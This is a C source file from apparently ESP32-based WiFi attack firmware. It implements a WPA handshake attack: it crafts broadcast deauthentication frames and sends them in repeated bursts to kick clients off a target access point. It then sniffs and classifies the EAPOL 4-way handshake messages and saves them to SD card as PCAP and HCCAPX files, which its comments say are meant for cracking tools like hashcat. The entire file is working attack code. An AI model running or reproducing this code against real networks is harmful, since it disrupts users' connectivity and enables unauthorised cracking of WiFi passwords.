/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "esp_wifi.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "frame_analyzer.h"
#include "frame_analyzer_parser.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "sniffer.h"

#include <stdio.h>
#include <time.h>
#include <sys/stat.h>

static const char *TAG = "attack_handshake";
static attack_handshake_methods_t method = -1;
static wifi_ap_record_t current_ap_record;
static esp_timer_handle_t deauth_timer_handle = NULL;
static bool attack_running = false;

// Track which handshake messages we've captured to avoid duplicates in PCAP
static bool captured_m1 = false;
static bool captured_m2 = false;
static bool captured_m3 = false;
static bool captured_m4 = false;
static uint8_t handshake_frame_count = 0;
static bool captured_beacon = false;

// Deauth frame template
static uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x01, 0x00                          // Reason code
};

/**
 * @brief Sends deauth frame burst for current AP (Pwnagotchi-style)
 */
static void send_deauth_frame() {
    // Verify we're on the correct channel
    uint8_t current_channel;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);
    
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], current_ap_record.bssid, 6);
    memcpy(&deauth_frame[16], current_ap_record.bssid, 6);
    
    ESP_LOGI(TAG, "Sending deauth BURST (5 packets) to %02x:%02x:%02x:%02x:%02x:%02x (SSID: %s) Ch %d", 
             current_ap_record.bssid[0], current_ap_record.bssid[1], 
             current_ap_record.bssid[2], current_ap_record.bssid[3],
             current_ap_record.bssid[4], current_ap_record.bssid[5],
             current_ap_record.ssid, current_channel);
    
    if (current_channel != current_ap_record.primary) {
        ESP_LOGW(TAG, "WARNING: Channel mismatch! Currently on %d but target is on %d", 
                 current_channel, current_ap_record.primary);
        // Try to reset channel
        esp_wifi_set_channel(current_ap_record.primary, WIFI_SECOND_CHAN_NONE);
    }
    
    // Send burst of 5 deauth packets (Pwnagotchi-style)
    for (int i = 0; i < 5; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to send deauth frame #%d: %s", i+1, esp_err_to_name(ret));
        }
        // Small delay between packets in burst (10ms)
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

/**
 * @brief Timer callback for periodic deauth frame sending
 */
static void deauth_timer_callback(void *arg) {
    send_deauth_frame();
}

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame and serializes them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static uint32_t eapol_frame_count = 0;

/**
 * @brief Determines which message (M1-M4) this EAPOL frame is
 * 
 * @return 1-4 for M1-M4, or 0 if unknown/invalid
 */
static uint8_t get_eapol_message_number(data_frame_t *frame) {
    eapol_packet_t *eapol = parse_eapol_packet(frame);
    if (!eapol) {
        ESP_LOGI(TAG, "  DEBUG: Failed to parse EAPOL packet");
        return 0;
    }
    
    eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
    if (!eapol_key) {
        ESP_LOGI(TAG, "  DEBUG: Failed to parse EAPOL-Key packet");
        return 0;
    }
    
    // Read Key Information as uint16_t (little-endian)
    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
    
    // Extract flags from raw value (little-endian byte order)
    // Key Information structure in network byte order:
    // Byte 0 (low):  [Key Descriptor Version:3][Key Type:1][reserved:2][Install:1][Key ACK:1]
    // Byte 1 (high): [Key MIC:1][Secure:1][Error:1][Request:1][Encrypted Key Data:1][SMK Message:1][reserved:2]
    
    // But ESP32 is little-endian, so we read bytes swapped
    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;  // High byte in little-endian = low byte in big-endian
    uint8_t byte1 = key_info_raw & 0xFF;         // Low byte in little-endian = high byte in big-endian
    
    bool key_ack = (byte0 & 0x80) != 0;     // Bit 7 of byte 0
    bool install = (byte0 & 0x40) != 0;     // Bit 6 of byte 0
    bool key_mic = (byte1 & 0x01) != 0;     // Bit 0 of byte 1
    bool secure = (byte1 & 0x02) != 0;      // Bit 1 of byte 1
    
    ESP_LOGI(TAG, "  Key Info=0x%04x ACK=%d Install=%d MIC=%d Secure=%d",
             key_info_raw, key_ack, install, key_mic, secure);
    
    // Determine message number by flags
    // M1: ACK=1, Install=0, MIC=0
    if (key_ack && !install && !key_mic) {
        ESP_LOGI(TAG, "  → Detected M1 (ACK=1, Install=0, MIC=0)");
        return 1;
    }
    // M2: ACK=0, MIC=1, has SNonce
    else if (!key_ack && key_mic && !install) {
        // Check if has SNonce (M2) or not (M4)
        bool has_nonce = false;
        for (int i = 0; i < 16; i++) {
            if (eapol_key->key_nonce[i] != 0) {
                has_nonce = true;
                break;
            }
        }
        if (has_nonce) {
            ESP_LOGI(TAG, "  → Detected M2 (ACK=0, MIC=1, has SNonce)");
            return 2;
        } else {
            ESP_LOGI(TAG, "  → Detected M4 (ACK=0, MIC=1, no SNonce)");
            return 4;
        }
    }
    // M3: ACK=1, Install=1, MIC=1
    else if (key_ack && install && key_mic) {
        ESP_LOGI(TAG, "  → Detected M3 (ACK=1, Install=1, MIC=1)");
        return 3;
    }
    
    ESP_LOGW(TAG, "  → Unknown combo: ACK=%d Install=%d MIC=%d", 
             key_ack, install, key_mic);
    return 0; // Unknown
}

/**
 * @brief Handler for MGMT frames (beacon/probe response)
 * 
 * Captures beacon frame from target AP to include ESSID in PCAP
 */
static void mgmt_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (captured_beacon) {
        return; // Already have beacon
    }
    
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    
    // Check if this is a beacon (subtype 0x80) or probe response (0x50)
    uint8_t frame_type = frame->payload[0];
    if (frame_type != 0x80 && frame_type != 0x50) {
        return; // Not beacon or probe response
    }
    
    // Check if BSSID matches (offset 16 for beacon/probe response)
    if (memcmp(&frame->payload[16], current_ap_record.bssid, 6) != 0) {
        return; // Not our target AP
    }
    
    // Save beacon to PCAP
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    captured_beacon = true;
    
    ESP_LOGI(TAG, "✓ BEACON frame captured and saved (ESSID: %s)", current_ap_record.ssid);
    ESP_LOGI(TAG, "  This frame is needed for PMK calculation in hashcat/wpa-sec");
}

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    eapol_frame_count++;
    
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    data_frame_t *data_frame = (data_frame_t *) frame->payload;
    
    // Determine which message this is
    uint8_t msg_num = get_eapol_message_number(data_frame);
    
    ESP_LOGI(TAG, ">>> EAPoL-Key frame #%lu captured (M%d) <<<", 
             (unsigned long)eapol_frame_count, msg_num);
    
    // Only save to PCAP if it's a unique message we haven't captured yet
    bool should_save_to_pcap = false;
    
    if (msg_num == 1 && !captured_m1) {
        captured_m1 = true;
        should_save_to_pcap = true;
        ESP_LOGI(TAG, "  ✓ M1 (ANonce from AP) - SAVED to PCAP");
    }
    else if (msg_num == 2 && !captured_m2) {
        captured_m2 = true;
        should_save_to_pcap = true;
        ESP_LOGI(TAG, "  ✓ M2 (SNonce from STA + MIC) - SAVED to PCAP");
    }
    else if (msg_num == 3 && !captured_m3) {
        captured_m3 = true;
        should_save_to_pcap = true;
        ESP_LOGI(TAG, "  ✓ M3 (ANonce + Install) - SAVED to PCAP");
    }
    else if (msg_num == 4 && !captured_m4) {
        captured_m4 = true;
        should_save_to_pcap = true;
        ESP_LOGI(TAG, "  ✓ M4 (Final ACK) - SAVED to PCAP");
    }
    else if (msg_num > 0) {
        ESP_LOGD(TAG, "  → M%d duplicate - SKIPPED", msg_num);
    }
    else {
        ESP_LOGW(TAG, "  → Unknown EAPOL type - SKIPPED");
    }
    
    // Save to PCAP only if unique
    if (should_save_to_pcap) {
        pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
        handshake_frame_count++;
        ESP_LOGI(TAG, "  → Total unique frames in PCAP: %d/4", handshake_frame_count);
    }
    
    // Always process for HCCAPX (it has its own logic)
    hccapx_serializer_add_frame(data_frame);
    
    // Show current handshake status
    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
    if (hccapx) {
        ESP_LOGD(TAG, "  HCCAPX status: message_pair=%d, EAPOL_len=%d bytes", 
                 hccapx->message_pair, hccapx->eapol_len);
    }
    
    // Check if we have all 4 messages
    if (captured_m1 && captured_m2 && captured_m3 && captured_m4) {
        ESP_LOGI(TAG, "✓✓✓ ALL 4 HANDSHAKE MESSAGES CAPTURED! ✓✓✓");
        ESP_LOGI(TAG, "Complete handshake ready - will be saved when attack stops");
    }
}

void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_methods_t attack_method){
    if (attack_running) {
        ESP_LOGW(TAG, "Handshake attack already running, stopping previous attack first");
        attack_handshake_stop();
    }
    
    ESP_LOGI(TAG, "Starting handshake attack...");
    ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
    ESP_LOGI(TAG, "Target Channel: %d", ap_record->primary);
    
    // Verify WiFi mode
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    const char *mode_str = (mode == WIFI_MODE_STA) ? "STA" : 
                           (mode == WIFI_MODE_AP) ? "AP" : 
                           (mode == WIFI_MODE_APSTA) ? "APSTA" : "UNKNOWN";
    ESP_LOGI(TAG, "Current WiFi mode: %s", mode_str);
    
    // Reset counters and flags
    eapol_frame_count = 0;
    handshake_frame_count = 0;
    captured_m1 = false;
    captured_m2 = false;
    captured_m3 = false;
    captured_m4 = false;
    captured_beacon = false;
    
    method = attack_method;
    memcpy(&current_ap_record, ap_record, sizeof(wifi_ap_record_t));
    
    // Initialize serializers
    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    
    // Set channel BEFORE enabling promiscuous mode
    ESP_LOGI(TAG, "Setting channel to %d", ap_record->primary);
    esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    
    // Give ESP32 time to switch channel (important!)
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Verify channel was set
    uint8_t current_channel;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);
    ESP_LOGI(TAG, "Current channel after set: %d (requested: %d)", current_channel, ap_record->primary);
    
    // Initialize sniffer
    sniffer_init();
    
    // Start sniffer (capture both DATA and MGMT frames)
    esp_wifi_set_promiscuous(true);
    
    // Verify channel again after promiscuous mode
    esp_wifi_get_channel(&current_channel, &second_chan);
    ESP_LOGI(TAG, "Current channel after promiscuous mode: %d", current_channel);
    
    ESP_LOGI(TAG, "Waiting for BEACON frame from target AP...");
    
    // Start frame analyzer
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    
    // Register handlers for both EAPOL and MGMT frames
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &mgmt_frame_handler, NULL));
    
    attack_running = true;
    
    // Start attack method
    switch(attack_method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            
            // Send first deauth burst immediately
            send_deauth_frame();
            
            // Create periodic timer for deauth bursts (every 1 second - Pwnagotchi-style)
            const esp_timer_create_args_t deauth_timer_args = {
                .callback = &deauth_timer_callback,
                .arg = NULL,
                .name = "deauth_timer"
            };
            ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
            ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000)); // 1 second - aggressive!
            break;
            
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
            
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
    
    ESP_LOGI(TAG, "Handshake attack started. Listening for WPA handshake...");
}

void attack_handshake_stop(){
    if (!attack_running) {
        ESP_LOGD(TAG, "No handshake attack running");
        return;
    }
    
    ESP_LOGI(TAG, "Stopping handshake attack...");
    
    // Stop attack method
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            if (deauth_timer_handle != NULL) {
                esp_timer_stop(deauth_timer_handle);
                esp_timer_delete(deauth_timer_handle);
                deauth_timer_handle = NULL;
            }
            break;
            
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
            
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    
    // Stop frame analyzer
    frame_analyzer_capture_stop();
    
    // Unregister event handlers (ignore ESP_ERR_NOT_FOUND if already unregistered)
    esp_err_t err;
    err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
        ESP_LOGE(TAG, "Failed to unregister EAPOL handler: %s", esp_err_to_name(err));
    }
    
    err = esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &mgmt_frame_handler);
    if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
        ESP_LOGE(TAG, "Failed to unregister MGMT handler: %s", esp_err_to_name(err));
    }
    
    // Stop sniffer
    esp_wifi_set_promiscuous(false);
    
    method = -1;
    attack_running = false;
    
    ESP_LOGI(TAG, "Handshake attack stopped");
    
    // Automatically save if we have a complete handshake
    ESP_LOGI(TAG, "Checking for complete handshake...");
    if (attack_handshake_save_to_sd()) {
        ESP_LOGI(TAG, "Handshake files saved to SD card!");
    } else {
        ESP_LOGW(TAG, "No complete 4-way handshake captured - nothing saved");
    }
}

uint8_t *attack_handshake_get_pcap(unsigned *size) {
    if (size != NULL) {
        *size = pcap_serializer_get_size();
    }
    return pcap_serializer_get_buffer();
}

void *attack_handshake_get_hccapx() {
    return hccapx_serializer_get();
}

bool attack_handshake_is_complete() {
    return (captured_m1 && captured_m2 && captured_m3 && captured_m4);
}

/**
 * @brief Helper function to check if array contains only zeros
 */
static bool is_zero_array(const uint8_t *array, size_t size) {
    for (size_t i = 0; i < size; i++) {
        if (array[i] != 0) {
            return false;
        }
    }
    return true;
}

/**
 * @brief Validates if handshake is complete and contains all necessary data
 * 
 * A valid WPA handshake MUST have:
 * - ANonce (from AP message 1 or 3)
 * - SNonce (from STA message 2)  
 * - Key MIC (from messages 2, 3, or 4)
 * - Both MAC addresses (AP and STA)
 * - EAPOL data
 * 
 * @param hccapx pointer to HCCAPX structure
 * @return true if handshake is complete and valid
 */
static bool is_handshake_complete(hccapx_t *hccapx) {
    if (!hccapx) {
        ESP_LOGW(TAG, "✗ HCCAPX structure is NULL");
        return false;
    }
    
    ESP_LOGI(TAG, "=== Handshake Validation ===");
    
    // Check message_pair (should not be 255 = unset)
    if (hccapx->message_pair == 255) {
        ESP_LOGW(TAG, "✗ message_pair is unset (255) - no handshake captured");
        return false;
    }
    ESP_LOGI(TAG, "✓ message_pair: %d", hccapx->message_pair);
    
    // Check ANonce (from AP)
    if (is_zero_array(hccapx->nonce_ap, 32)) {
        ESP_LOGW(TAG, "✗ ANonce is empty - missing AP message (M1 or M3)");
        return false;
    }
    ESP_LOGI(TAG, "✓ ANonce present (from AP)");
    
    // Check SNonce (from STA)
    if (is_zero_array(hccapx->nonce_sta, 32)) {
        ESP_LOGW(TAG, "✗ SNonce is empty - missing STA message (M2)");
        return false;
    }
    ESP_LOGI(TAG, "✓ SNonce present (from STA)");
    
    // Check Key MIC
    if (is_zero_array(hccapx->keymic, 16)) {
        ESP_LOGW(TAG, "✗ Key MIC is empty - missing authenticated message");
        return false;
    }
    ESP_LOGI(TAG, "✓ Key MIC present");
    
    // Check AP MAC
    if (is_zero_array(hccapx->mac_ap, 6)) {
        ESP_LOGW(TAG, "✗ AP MAC is empty");
        return false;
    }
    ESP_LOGI(TAG, "✓ AP MAC: %02x:%02x:%02x:%02x:%02x:%02x",
             hccapx->mac_ap[0], hccapx->mac_ap[1], hccapx->mac_ap[2],
             hccapx->mac_ap[3], hccapx->mac_ap[4], hccapx->mac_ap[5]);
    
    // Check STA MAC
    if (is_zero_array(hccapx->mac_sta, 6)) {
        ESP_LOGW(TAG, "✗ STA MAC is empty");
        return false;
    }
    ESP_LOGI(TAG, "✓ STA MAC: %02x:%02x:%02x:%02x:%02x:%02x",
             hccapx->mac_sta[0], hccapx->mac_sta[1], hccapx->mac_sta[2],
             hccapx->mac_sta[3], hccapx->mac_sta[4], hccapx->mac_sta[5]);
    
    // Check EAPOL data
    if (hccapx->eapol_len == 0 || hccapx->eapol_len > 256) {
        ESP_LOGW(TAG, "✗ EAPOL length invalid: %d", hccapx->eapol_len);
        return false;
    }
    ESP_LOGI(TAG, "✓ EAPOL data: %d bytes", hccapx->eapol_len);
    
    // Check SSID
    if (hccapx->essid_len == 0 || hccapx->essid_len > 32) {
        ESP_LOGW(TAG, "✗ SSID length invalid: %d", hccapx->essid_len);
        return false;
    }
    ESP_LOGI(TAG, "✓ SSID: %.*s (%d bytes)", hccapx->essid_len, hccapx->essid, hccapx->essid_len);
    
    ESP_LOGI(TAG, "=========================");
    ESP_LOGI(TAG, "✓✓✓ HANDSHAKE IS COMPLETE AND VALID ✓✓✓");
    
    return true;
}

/**
 * @brief Saves complete handshake to SD card
 * 
 * @return true if handshake was complete and saved successfully
 * @return false if no complete handshake or save failed
 */
bool attack_handshake_save_to_sd() {
    // Check if we have a complete handshake
    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
    
    if (!hccapx) {
        ESP_LOGW(TAG, "No handshake data available");
        return false;
    }
    
    // Validate handshake completeness
    if (!is_handshake_complete(hccapx)) {
        ESP_LOGW(TAG, "Handshake validation failed - not saving");
        return false;
    }
    
    // Get PCAP data
    unsigned pcap_size;
    uint8_t *pcap_buf = pcap_serializer_get_buffer();
    pcap_size = pcap_serializer_get_size();
    
    if (!pcap_buf || pcap_size == 0) {
        ESP_LOGW(TAG, "No PCAP data to save");
        return false;
    }
    
    // Create directory if it doesn't exist
    struct stat st = {0};
    if (stat("/sdcard/lab/handshakes", &st) == -1) {
        mkdir("/sdcard/lab/handshakes", 0700);
        ESP_LOGI(TAG, "Created /sdcard/lab/handshakes directory");
    }
    
    // Generate filename with SSID and timestamp
    char filename[128];
    char ssid_safe[33];
    
    // Sanitize SSID for filename (replace spaces and special chars with underscore)
    strncpy(ssid_safe, (char *)hccapx->essid, sizeof(ssid_safe) - 1);
    ssid_safe[sizeof(ssid_safe) - 1] = '\0';
    for (int i = 0; ssid_safe[i]; i++) {
        if (ssid_safe[i] == ' ' || ssid_safe[i] == '/' || ssid_safe[i] == '\\') {
            ssid_safe[i] = '_';
        }
    }
    
    // Use timestamp for unique filename
    uint64_t timestamp = esp_timer_get_time() / 1000; // milliseconds
    
    // Save PCAP file
    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%llu.pcap", 
             ssid_safe, (unsigned long long)timestamp);
    
    FILE *f = fopen(filename, "wb");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open file for writing: %s", filename);
        return false;
    }
    
    size_t written = fwrite(pcap_buf, 1, pcap_size, f);
    fclose(f);
    
    if (written != pcap_size) {
        ESP_LOGE(TAG, "Failed to write complete PCAP (%zu/%u bytes)", written, pcap_size);
        return false;
    }
    
    ESP_LOGI(TAG, "✓ PCAP saved: %s (%u bytes)", filename, pcap_size);
    
    // Analyze PCAP content
    ESP_LOGI(TAG, "  PCAP Analysis:");
    ESP_LOGI(TAG, "    - Total PCAP size: %u bytes", pcap_size);
    ESP_LOGI(TAG, "    - PCAP header: 24 bytes");
    ESP_LOGI(TAG, "    - Frame data: ~%u bytes", pcap_size - 24);
    ESP_LOGI(TAG, "    - Captured BEACON: %s", captured_beacon ? "YES" : "NO");
    ESP_LOGI(TAG, "    - Unique handshake frames: %d/4", handshake_frame_count);
    
    if (!captured_beacon) {
        ESP_LOGW(TAG, "  WARNING: No BEACON frame! PCAP may fail validation.");
        ESP_LOGW(TAG, "  Tools need BEACON/PROBE RESPONSE for ESSID to calculate PMK.");
    }
    
    if (handshake_frame_count < 4) {
        ESP_LOGW(TAG, "  WARNING: Incomplete handshake (%d/4 frames)", handshake_frame_count);
    }
    
    // Save HCCAPX file
    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%llu.hccapx", 
             ssid_safe, (unsigned long long)timestamp);
    
    f = fopen(filename, "wb");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open HCCAPX file: %s", filename);
        return false;
    }
    
    written = fwrite(hccapx, 1, sizeof(hccapx_t), f);
    fclose(f);
    
    if (written != sizeof(hccapx_t)) {
        ESP_LOGE(TAG, "Failed to write complete HCCAPX");
        return false;
    }
    
    ESP_LOGI(TAG, "✓ HCCAPX saved: %s (%zu bytes)", filename, sizeof(hccapx_t));
    ESP_LOGI(TAG, "✓ Complete 4-way handshake saved for SSID: %s (message_pair: %d)", 
             ssid_safe, hccapx->message_pair);
    
    return true;
}

